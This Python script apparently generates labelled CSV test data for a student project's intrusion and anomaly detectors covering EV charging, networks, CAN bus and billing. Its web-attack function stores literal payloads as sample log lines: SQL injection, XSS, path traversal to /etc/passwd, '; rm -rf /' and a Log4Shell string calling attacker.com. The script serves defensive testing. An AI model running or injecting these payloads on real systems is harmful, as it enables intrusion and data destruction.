import pandas as pd
import numpy as np
import os
import random
from datetime import datetime, timedelta

# --- Configuration ---
BASE_PATH = r"c:\Users\smt1s\OneDrive\Belgeler\GitHub\Bilgi-Sistemleri-ve-G-venli-i"
TEST_DATA_DIR = os.path.join(BASE_PATH, "test_data")

if not os.path.exists(TEST_DATA_DIR):
    os.makedirs(TEST_DATA_DIR)

# --- Generator Functions ---

def gen_yousef_test():
    # Yousef: OCPP Security
    data = []
    base_time = datetime.now()
    
    # 5 Normal Rows
    for i in range(5):
        data.append({
            "timestamp": (base_time + timedelta(seconds=i)).strftime("%Y-%m-%dT%H:%M:%S.%f"),
            "event_type": "normal", "attack_type": "NONE", "blocked": 0, "time_delta_ms": random.randint(0, 5), "label": 0
        })
        
    # 10 Attack/Dirty Rows
    attacks = [
        ("attack", "OCPP_INJECTION_ATTEMPT", 1),
        ("attack", "TLS_DOWGRADE_DETECTED", 1),
        ("attack", "UNAUTHORIZED_CHARGING_START", 1),
        ("attack", "FIRMWARE_SIGNATURE_MISMATCH", 1),
        ("attack", "HEARTBEAT_FLOOD", 1),
        ("suspicious", "OCPP_INJECTION_ATTEMPT", 0), # Detected but not blocked
        ("attack", "CRITICAL_AUTH_FAILURE", 1),
        ("attack", "SQL_INJECTION_OCPP", 1),
        ("attack", "MITM_KEY_SUBSTITUTION", 1),
        ("attack", "REPLAY_ATTACK_DETECTED", 1)
    ]
    for i, (evt, atk, blk) in enumerate(attacks):
        data.append({
            "timestamp": (base_time + timedelta(seconds=20+i)).strftime("%Y-%m-%dT%H:%M:%S.%f"),
            "event_type": evt, "attack_type": atk, "blocked": blk, "time_delta_ms": random.randint(10, 100), "label": 1
        })
        
    df = pd.DataFrame(data)
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_YOUSEF.csv"), index=False)
    print("Generated test_YOUSEF.csv with complex attacks.")

def gen_samet_test():
    # Samet: Network IDS
    data = []
    base_time = datetime.now()
    
    # Normal
    for i in range(5):
        data.append({"timestamp": str(base_time), "level": "NORMAL", "detail": "Traffic Flow OK", "action": "OK", "id": i, "label": 0})
        
    # Attacks (Dirty/Malicious)
    attacks = [
        "Yan Hareket / Ağ Keşfi (Nmap Scan)",
        "Firmware Enjeksiyonu Denemesi",
        "Ters Bağlantı (Reverse Shell) Tespit Edildi",
        "Brute Force: SSH root login attempt",
        "Veri Sızıntısı: FTP üzerinden toplu paket çıkışı",
        "Ransomware Signatıre: .encrypted extension write",
        "DDoS Attack: SYN Flood from multiple sources"
    ]
    for i, attack in enumerate(attacks):
        data.append({
            "timestamp": str(base_time), "level": "SALDIRI", "detail": attack, "action": "Bloklandı", "id": 1000+i, "label": 1
        })
        
    df = pd.DataFrame(data)
    df['severity'] = "High"
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_SAMET.csv"), index=False)
    print("Generated test_SAMET.csv with deep IDS patterns.")

def gen_atakan_test():
    # Atakan: Load Manipulation
    data = []
    # Normal (Stabil)
    for i in range(10):
        data.append({"timestamp": datetime.now(), "load_kw": random.uniform(3, 8), "attack_type": "NULL", "label": 0})
    # Attack (Extreme/Anomalous spikes)
    anomalies = [15.5, 22.0, 45.1, 0.1, 99.9, 12.5, 18.2]
    for val in anomalies:
        data.append({"timestamp": datetime.now(), "load_kw": val, "attack_type": "LOAD_MANIPULATION", "label": 1})
    df = pd.DataFrame(data)
    for col in ['source', 'event_type', 'unit', 'log_level']: df[col] = "grid_monitor"
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_ATAKAN.csv"), index=False)
    print("Generated test_ATAKAN.csv with extreme load spikes.")

def gen_emirhan_test():
    # Emirhan: K8s / Web Attacks
    data = []
    # Normal
    data.append({"message": "GET /api/v1/health 200 OK", "label": 0})
    data.append({"message": "User login success: admin", "label": 0})
    
    # Dirty / Malicious
    malicious = [
        "SQLi: SELECT * FROM users WHERE id = '1' OR '1'='1'",
        "XSS: <script>alert('pwned')</script>",
        "Path Traversal: GET /../../etc/passwd",
        "RCE: ; rm -rf /",
        "Credential Stuffing: 100 failed attempts from IP 45.x.y.z",
        "JWT Bypass: algorithm none detected",
        "Log4Shell: ${jndi:ldap://attacker.com/a}"
    ]
    for msg in malicious:
        data.append({"message": msg, "label": 1})
        
    df = pd.DataFrame(data)
    for col in ['timestamp','level','severity','action','stage','rule_id','source_ip','source_port','dest_ip','dest_port','http_method','http_path','http_status','ocp_namespace','ocp_pod']:
        df[col] = "0"
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_EMİRHAN.csv"), index=False)
    print("Generated test_EMİRHAN.csv with web vulnerabilities.")

def gen_ibrahim_test():
    # Ibrahim: Time Anomaly
    data = []
    # Normal
    data.append({"attack_type": "NULL", "detail": "Clock synced with NTP", "status": "Normal", "event_type": "Info", "label": 0})
    # Malicious Time Drifts
    drifts = [
        "Zaman Kayması: +15 dakika fark",
        "Gelecek Zamanlı Log: 2026-01-01 detected",
        "Epoch Reset: Unix timestamp 0 detected",
        "NTP Poisoning: False time source injected"
    ]
    for drift in drifts:
        data.append({"attack_type": "TIME_ANOMALY", "detail": drift, "status": "CRITICAL", "event_type": "ALERT", "label": 1})
    
    df = pd.DataFrame(data)
    for col in ['timestamp', 'source']: df[col] = "0"
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_İBRAHİM.csv"), index=False)
    print("Generated test_İBRAHİM.csv with time anomalies.")

def gen_suzan_test():
    # Suzan: Energy Fraud
    data = []
    # Normal
    data.append({"ocpp_message": "MeterValues", "status": "Charging", "price_eur_kwh": 0.45, "energy_kwh": 5.2, "power_kw": 11, "label": 0})
    # Fraudulent behavior
    frauds = [
        {"price": 99.0, "energy": 0, "status": "PRICE_SPIKE"},
        {"price": 0.01, "energy": 500, "status": "UNDER_BILLING"},
        {"price": -1.5, "energy": 10, "status": "NEGATIVE_PRICE_FRAUD"},
        {"price": 0.5, "energy": 8000, "status": "EXTREME_CONSUMPTION"}
    ]
    for f in frauds:
        data.append({"ocpp_message": "MeterValues", "status": f['status'], "price_eur_kwh": f['price'], "energy_kwh": f['energy'], "power_kw": 22, "label": 1})
    
    df = pd.DataFrame(data)
    df['timestamp'] = str(datetime.now())
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_SUZAN.csv"), index=False)
    print("Generated test_SUZAN.csv with energy fraud patterns.")

def gen_irem_test():
    # Irem: CAN Bus
    data = []
    # Normal
    data.append({"length": 64, "protocol_ip": 1, "protocol_can": 0, "can_id_anomaly": 0, "label": 0})
    # CAN Attacks
    attacks = [
        {"len": 8, "can": 1, "anom": 1}, # Replay
        {"len": 2, "can": 1, "anom": 1}, # Malformed
        {"len": 128, "can": 1, "anom": 1}, # Buffer Overflow attempt
        {"len": 0, "can": 1, "anom": 1}, # Null frame
    ]
    for a in attacks:
        data.append({"length": a['len'], "protocol_ip": 0, "protocol_can": a['can'], "can_id_anomaly": a['anom'], "label": 1})
    
    df = pd.DataFrame(data)
    df['timestamp'] = 0
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_İREM.csv"), index=False)
    print("Generated test_İREM.csv with CAN bus attacks.")

def gen_mirac_test():
    # Mirac: Registration Anomaly
    data = []
    # Normal
    data.append({"input_name": "Can", "input_plate": "06XXX01", "reason": "Basarili", "label": 0})
    # Anomalies
    anomalies = [
        ("X", "06XXX01", "REUSED_PLATE"),
        ("Admin", "DROP TABLE", "SQL_INJECTION"),
        ("Test", "34-UNKNOWN-99", "INVALID_FORMAT"),
        ("Anonymous", "12345678", "BLACKLISTED_SOURCE")
    ]
    for name, plate, reason in anomalies:
        data.append({"input_name": name, "input_plate": plate, "reason": reason, "label": 1})
    
    df = pd.DataFrame(data)
    for col in ['energy_kwh', 'duration_min', 'avg_power_kw']: df[col] = 0
    df['timestamp'] = str(datetime.now())
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_MİRAÇ.csv"), index=False)
    print("Generated test_MİRAÇ.csv with registration errors.")

def gen_emirhnt_test():
    # Emirhnt: Billing Mismatch
    data = []
    data.append({"Durum": "Normal", "Tuketim_kWh": 5, "label": 0, "UygulananTarife": 1, "OlmasiGerekenTarife": 1})
    # Mismatches (Dirty)
    mismatches = [
        ("MISMATCH_FOUND", 5, 2, 1),
        ("CRITICAL_OVERCHARGE", 100, 50, 10),
        ("TARIFF_MANIPULATION", 0, 10, 0)
    ]
    for status, cons, applied, shouldbe in mismatches:
        data.append({"Durum": status, "Tuketim_kWh": cons, "label": 1, "UygulananTarife": applied, "OlmasiGerekenTarife": shouldbe})
    
    df = pd.DataFrame(data)
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_EMİRHNT.csv"), index=False)
    print("Generated test_EMİRHNT.csv with billing anomalies.")

def gen_ali_test():
    # Ali: Transaction Sequence Attacks
    data = []
    # Normal sequence
    for act in ["BootNotification", "StatusNotification", "Heartbeat"]:
        data.append({"timestamp": str(datetime.now()), "status": "NORMAL", "message_id": "1", "action": act, "transaction_id": "", "label": 0})
    # Malicious sequences
    attacks = [
        ("RemoteStopTransaction", "FORCED_STOP"),
        ("UnlockConnector", "UNAUTHORIZED_UNLOCK"),
        ("ChangeConfiguration", "PARAMETER_TAMPERING"),
        ("Reset", "DOS_RESET_LOOP")
    ]
    for act, stat in attacks:
        data.append({"timestamp": str(datetime.now()), "status": stat, "message_id": "666", "action": act, "transaction_id": "9999", "label": 1})
    
    df = pd.DataFrame(data)
    df.to_csv(os.path.join(TEST_DATA_DIR, "test_ALİ.csv"), index=False)
    print("Generated test_ALİ.csv with transaction attacks.")

if __name__ == "__main__":
    gen_yousef_test()
    gen_samet_test()
    gen_atakan_test()
    gen_emirhan_test()
    gen_ibrahim_test()
    gen_suzan_test()
    gen_irem_test()
    gen_mirac_test()
    gen_emirhnt_test()
    gen_ali_test()
    print("\n✅ All Malicious/Dirty test data generated successfully.")
